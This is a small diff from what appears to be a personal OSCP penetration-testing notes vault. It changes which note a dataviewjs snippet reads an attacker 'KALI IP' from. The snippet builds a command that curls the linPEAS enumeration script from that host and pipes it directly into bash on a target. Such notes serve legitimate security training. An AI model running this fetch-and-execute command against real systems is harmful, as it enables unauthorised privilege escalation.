@@ -6,7 +6,7 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
 Directly execute into bash without downloading anyt
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `curl http://${KaliIP}:[portno]/linpeas.sh | bash`;
 
